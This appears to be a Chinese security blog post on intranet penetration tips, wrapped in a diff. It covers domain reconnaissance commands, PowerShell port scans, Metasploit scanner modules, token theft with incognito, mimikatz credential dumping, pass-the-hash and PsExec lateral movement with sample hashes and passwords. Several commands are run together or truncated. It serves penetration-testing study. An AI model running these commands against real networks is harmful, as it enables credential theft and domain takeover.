@@ -1,0 +1,430 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>内网渗透小tips | 0000FF's Blog</title><meta name="author" content="0000FF"><meta name="copyright" content="0000FF"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="内网渗透思路通过域成员主机，定位出 域控制器 IP 及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中 dump 出域管理员密码，进而拿下域控制器、渗透整个内网。 内网基础知识1、工作组： 工作组是 局域网 中的一个概念，他是长久的资源管理模式。默认情况下使用工作组方式进行资源管理，将不同的 co">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透小tips">
+<meta property="og:url" content="https://chr1sto4f.github.io/2023/01/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B0%8Ftips/index.html">
+<meta property="og:site_name" content="0000FF&#39;s Blog">
+<meta property="og:description" content="内网渗透思路通过域成员主机，定位出 域控制器 IP 及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中 dump 出域管理员密码，进而拿下域控制器、渗透整个内网。 内网基础知识1、工作组： 工作组是 局域网 中的一个概念，他是长久的资源管理模式。默认情况下使用工作组方式进行资源管理，将不同的 co">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220402171614_50e92.jpeg">
+<meta property="article:published_time" content="2023-01-25T10:21:52.000Z">
+<meta property="article:modified_time" content="2023-01-27T06:08:56.935Z">
+<meta property="article:author" content="0000FF">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220402171614_50e92.jpeg"><link rel="shortcut icon" href="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg"><link rel="canonical" href="https://chr1sto4f.github.io/2023/01/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B0%8Ftips/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网渗透小tips',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-01-27 14:08:56'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220402171614_50e92.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">0000FF's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网渗透小tips</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-25T10:21:52.000Z" title="发表于 2023-01-25 18:21:52">2023-01-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-27T06:08:56.935Z" title="更新于 2023-01-27 14:08:56">2023-01-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网渗透小tips"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="内网渗透思路"><a href="#内网渗透思路" class="headerlink" title="内网渗透思路"></a><strong>内网渗透思路</strong></h1><p>通过域成员主机，定位出 域控制器 IP 及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中 dump 出域管理员密码，进而拿下域控制器、渗透整个内网。</p>
+<h2 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a><strong>内网基础知识</strong></h2><p><strong>1、工作组：</strong></p>
+<p>工作组是 局域网 中的一个概念，他是长久的资源管理模式。默认情况下使用工作组方式进行资源管理，将不同的 computer 按照不同的要求分类到不同的组。</p>
+<p><strong>2、域:</strong></p>
+<p>用来描述一种架构，和“工作组”相对应，由工作组升级而来的高级架构，域(Domain)是一个有安全边界的计算机集合（安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）。可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域内的资源，就必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p>
+<p><strong>3、域名服务器 DNS</strong></p>
+<p>是指用于实现域名和与之相对应的 IP 地址转换 的服务器。而实际上，因为域名的计算机是使用DNS 来定位域控制器、服务器及其他计算机、网络服务的，所以域的名字就是DNS 域的名字。在内网渗透测试中，大都是通过寻找 DNS 服务器来确定域控制器的位置的。</p>
+<p><strong>4、域控内部</strong></p>
+<p><strong>NTDS.dit：</strong>域用户帐户以域数据库的形式保存在活动目录中 <strong>Ntdsutil.exe-ntdsutil.exe：</strong>是域控制器自带的域数据库管理工具，从 windowsServer 2008 开始就默认自带了。因此我们可以通过 <strong>ntdsutil.exe</strong> 提取出域中所有的域用户信息</p>
+<p><strong>5、活动目录</strong></p>
+<p>帐号集中管理：所有帐号均存在服务器上，方便对帐号的重命名&#x2F;重置密码。软件集中管理：统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件,可以让用户自由选择安装软件。环境集中管理：利用 AD 可以统一客户端桌面，IE，TCP&#x2F;IP 等设置。增强安全性：统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。更可靠：更少的宕机时间。如：利用 AD 控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。活动目录为 Microsoft 统一管理的基础平台，其它 ISA、Exchange、SMS 等服务都依赖于这个基础平台。</p>
+<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a><strong>域信息收集</strong></h2><p><strong>一、常用命令</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta 查看当前在线用户</span><br><span class="line">net user 查看本机用户</span><br><span class="line">net user /domain 查看域用户</span><br><span class="line">net view &amp; net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain 查看当前域计算机列表 第二个查的更多</span><br><span class="line">net view /domain 查看有几个域</span><br><span class="line">net view \\\\dc 查看 dc 域内共享文件</span><br><span class="line">net <span class="built_in">group</span> /domain 查看域里面的组</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain 查看域管</span><br><span class="line">net localgroup administrators /domain /这个也是查域管，是升级为域控时，本地账户也成为域管</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain 域控</span><br><span class="line">net time /domainnet config workstation 当前登录域 - 计算机名 - 用户名</span><br><span class="line">net use \\\\域控(如 pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源ipconfig</span><br></pre></td></tr></table></figure>
+
+<p><strong>二、查找域服务器</strong></p>
+<p><strong>三、查询域控</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping darkid.hack.com</span><br><span class="line">nslookup darkid.hack.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>四、主机发现</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp <span class="literal">-a</span> 查询通信</span><br><span class="line">nbtscan 发现主机</span><br><span class="line">nbtscan.exe <span class="literal">-r</span> <span class="number">192.168</span>.<span class="number">0.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<p>bat命令发现主机</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l %i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> @ping <span class="number">192.168</span>.<span class="number">0</span>.%i <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">1</span>|find /i <span class="string">&quot;ttl=&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过powershell脚本扫描</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">&quot;Import-Module ./Invoke-TSPingSweep.ps1;Invoke-TSPingSweep StartAddress 192.168.1.0 -En</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">脚本下载地址：https://gallery.technet.microsoft.com/scriptcenter/Invoke-TSPingSweep-b71f1b9b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#针对单个 IP 的多个端口的扫描：1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;</span><span class="number">192.168</span>.<span class="number">246.44</span><span class="string">&quot;,<span class="variable">$_</span>)) &quot;</span>Port <span class="variable">$_</span> is open!<span class="string">&quot;&#125;2&gt;<span class="variable">$null</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#针对某 IP 段中单个端口的扫描：foreach (<span class="variable">$ip</span> in 1..20) &#123;Test-NetConnection -Port 80 -InformationLevel &quot;</span>Detailed<span class="string">&quot; 192.168.1.<span class="variable">$ip</span>&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#针对某 IP 段 &amp; 多个端口的扫描器1..20 | % &#123; <span class="variable">$a</span> = <span class="variable">$_</span>; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;</span><span class="number">10.0</span>.<span class="number">0</span>.<span class="variable">$a</span><span class="string">&quot;,<span class="variable">$_</span>)) &quot;</span>Port <span class="variable">$_</span> is open!<span class="string">&quot;&#125; 2&gt;<span class="variable">$</span></span></span><br></pre></td></tr></table></figure>
+
+<p>使用MSF进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用 msf 进行反弹 shell 进行内网渗透时，通过 msf 自带的扫描模块进行快速扫描。</span><br><span class="line">#主机存活探测：auxiliary/scanner/discovery/arp_sweep ARP 扫描auxiliary/scanner/discovery/udp_sweep UDP 扫描auxiliary/scanner/netbios/nbname NETBIOS 扫描auxiliary/scanner/snmp/snmp_enum SNMP 扫描auxiliary/scanner/smb/smb_version SMB 扫描</span><br><span class="line">#端口扫描：auxiliary/scanner/portscan/ack TCP ACK 端口扫描auxiliary/scanner/portscan/ftpbounce FTP bounce 端口扫描auxiliary/scanner/portscan/syn SYN 端口扫描auxiliary/scanner/portscan/tcp TCP 端口扫描auxiliary/scanner/portscan/xmas TCP XMas 端口扫描</span><br></pre></td></tr></table></figure>
+
+<p><strong>内网渗透中的token</strong></p>
+<p>概述：令牌(token)是系统的<strong>临时秘钥</strong>，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前</p>
+<p>提下，<strong>访问网络和系统资源</strong>，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net time <span class="comment">#查询域中的时间，会请求域控</span></span><br><span class="line">net config workstation <span class="comment">#查看当前工作环境</span></span><br><span class="line">nltest /dclist:域后缀 <span class="comment">#查询域控</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">&quot;Import-Module ./Invoke-TSPingSweep.ps1;Invoke-TSPingSweep StartAddress 192.168.1.0 -En脚本下载地址：https://gallery.technet.microsoft.com/scriptcenter/Invoke-TSPingSweep-b71f1b9b</span></span><br></pre></td></tr></table></figure>
+
+<p><em>#针对单个</em> <em>IP</em> <em>的多个端口的扫描：</em></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>..<span class="number">1024</span> | % &#123;<span class="built_in">echo</span> ((<span class="built_in">new-object</span> Net.Sockets.TcpClient).Connect(<span class="string">&quot;192.168.246.44&quot;</span>,<span class="variable">$_</span>)) <span class="string">&quot;Port <span class="variable">$_</span> is open!&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><em>#针对某</em> <em>IP</em> <em>段中单个端口的扫描：</em></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ip</span> <span class="keyword">in</span> <span class="number">1</span>..<span class="number">20</span>) &#123;<span class="built_in">Test-NetConnection</span> <span class="literal">-Port</span> <span class="number">80</span> <span class="literal">-InformationLevel</span> <span class="string">&quot;Detailed&quot;</span> <span class="number">192.168</span>.<span class="number">1</span>.<span class="variable">$ip</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><em>#使用</em> <em>msf</em> <em>进行反弹</em> <em>shell</em> <em>进行内网渗透时，通过</em> <em>msf</em> <em>自带的扫描模块进行快速扫描。</em>*#*<em>主机存活探测：</em></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep ARP 扫描</span><br><span class="line">auxiliary/scanner/discovery/udp_sweep UDP 扫描</span><br><span class="line">auxiliary/scanner/netbios/nbname NETBIOS 扫描</span><br><span class="line">auxiliary/scanner/snmp/snmp_enum SNMP 扫描</span><br><span class="line">auxiliary/scanner/smb/smb_version SMB 扫描</span><br></pre></td></tr></table></figure>
+
+<p><em>#端口扫描：</em></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack TCP ACK 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce FTP bounce 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/syn SYN 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/tcp TCP 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/xmas TCP XMas 端口扫描</span><br></pre></td></tr></table></figure>
+
+<h3 id="一、描述"><a href="#一、描述" class="headerlink" title="一、描述"></a><strong>一、描述</strong></h3><p><strong>1、攻击手段</strong></p>
+<p>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</p>
+<p><strong>2、令牌的种类</strong></p>
+<p>访问令牌(Access Token)：表示访问控制操作主体的系统对象</p>
+<p>会话令牌(Session Token)：是交互会话中唯一的身份标识符</p>
+<p>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如 U 盾</p>
+<p><strong>3、Windows的access token的类型</strong></p>
+<p>delegation token：授权令牌，支持交互式会话登录</p>
+<p>impersonation token：模拟令牌，非交互式令牌</p>
+<p>【注】两种 token 只在系统重启后清除 具有 Delegation token 的用户在注销后，该 Token 将变成 Impersonation token，依旧有效。</p>
+<h3 id="二、AccessToken-的窃取与利用"><a href="#二、AccessToken-的窃取与利用" class="headerlink" title="二、AccessToken 的窃取与利用"></a><strong>二、AccessToken 的窃取与利用</strong></h3><p><strong>1、前提</strong></p>
+<p>AccessToken 的窃取与利用需要 administrator 管理员权限。</p>
+<p><strong>2、窃取access token的方法</strong></p>
+<p>incognito.exe 程序</p>
+<p>InvokeTokenManipulat.ps1 脚本</p>
+<p>MSF 里的 incognito 模块</p>
+<p><strong>3、incognito</strong></p>
+<p>程序地址：<a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
+<p><strong>4、msf窃取token</strong></p>
+<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a><strong>横向渗透</strong></h2><h3 id="一、PTH（pass-the-hash）"><a href="#一、PTH（pass-the-hash）" class="headerlink" title="一、PTH（pass the hash）"></a><strong>一、PTH（pass the hash）</strong></h3><p>概述：pass-the-hash 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。</p>
+<p><strong>1、pass the hash的原理</strong></p>
+<p>在Windows系统中，通常会使用NTLM身份认证</p>
+<p><em>#AccessToken</em> <em>的列举</em></p>
+<p>incognito.exe list_tokens -u</p>
+<p><em>#操作</em></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute <span class="literal">-c</span> <span class="string">&quot;完整的 Token 名&quot;</span> cmd.exe</span><br><span class="line">incognito.exe execute <span class="literal">-c</span> <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe</span><br><span class="line">use incognito <span class="comment">#加载 incognito</span></span><br><span class="line">list_tokens <span class="literal">-u</span> <span class="comment">#列出 AccessToken</span></span><br><span class="line">getuid <span class="comment">#查看当前 token</span></span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="comment">#模拟 system 用户，getsystem 命令即实现了该命令。如果要模拟其他用户，将 token 名改为其他用户即</span></span><br></pre></td></tr></table></figure>
+
+<p>ps *#<strong>列出进程</strong>pid*</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steal_token <span class="number">1252</span> <span class="comment">#从进程窃取 token</span></span><br><span class="line">getsystem <span class="comment">#提升至 system 权限</span></span><br><span class="line">rev2self <span class="comment">#返回到之前的 AccessToken 权限</span></span><br></pre></td></tr></table></figure>
+
+<p> NTLM认证不使用明文口令，而是使用加密后的hash值，hash值由系统API生成</p>
+<p>hash分为LM hash 和NTLM hash，如果密码大于15位则无法生成LM hash，从2008以后微软禁用LM hash</p>
+<p>攻击者获取了hash，就可以在身份认证的时候模拟该用户（跳过调用API生成hash的过程）</p>
+<p><strong>2、适用范围</strong></p>
+<p>域环境&#x2F;工作组环境</p>
+<p>可以获取hash，但是条件是不允许爆破hash</p>
+<p>内网中存在和当前机器相同的密码</p>
+<p><strong>3、关于微软补丁和禁用</strong></p>
+<p>在打了补丁后，常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator(SID 500)账号例外，利用这个账号</p>
+<p>仍可以进行 Pass The Hash 远程 ipc 连接。</p>
+<p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用mimikatz 还是可以攻击成功。</p>
+<p>从 windows 到 windows 横向 pth 这一类攻击方法比较广泛。</p>
+<p><strong>4、攻击</strong></p>
+<p>使用mimikatz</p>
+<p>得到hash后</p>
+<p>成功后 会弹出终端 cmd。此时的cmd中以及导入了hash可以进行ipc等连接</p>
+<h3 id="二、Psexec"><a href="#二、Psexec" class="headerlink" title="二、Psexec"></a><strong>二、Psexec</strong></h3><p><strong>1、概述</strong></p>
+<p>psexec 是 windows 官方自带的，不会存在查杀问题，属于 pstools 利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主</p>
+<p>机上创建一个psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过psexec 服务运行命令，运行结束后删除服务。</p>
+<p><strong>2、条件</strong></p>
+<p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。对方开放 <strong>445</strong> 端口，就相当于开放了 <strong>smb</strong> <strong>协议</strong>。且<strong>防火墙要关闭</strong>。</p>
+<p><strong>3、明文连接</strong></p>
+<p><strong>4、hash连接</strong></p>
+<p>出现错误的情况可以使用impacket工具包下的psexec连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debugsekurlsa::logonpasswordsmimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;&gt; password.txtprivilege::debugsekurlsa::pth /user:administrator /domain:workgroup /ntlm:32ed87bdb5fdc5e9cba88547376818d4</span><br></pre></td></tr></table></figure>
+
+
+
+<p><em>#命令</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe /accepteula /s \\192.168.0.123 -u Administrator -p 123456cmdPsExec.exe /accepteula /s \\192.168.0.141 -u Administrator -p 123456 cmd /c &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><em>#参数</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell直接直接执行回显-u 域\用户名-p 密码</span><br></pre></td></tr></table></figure>
+
+<p><em>#命令</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 ./Administrator@192.168.0.123</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>5、psexec注意事项</strong></p>
+<p>需要远程系统开启 admin$ 共享（默认是开启的）</p>
+<p>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</p>
+<p>在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</p>
+<p>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会</p>
+<p>产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</p>
+<p>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是administrator 权限的shell</p>
+<p>在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。</p>
+<p><strong>6、登陆域管理命令</strong></p>
+<p>impacket 下的 psexec</p>
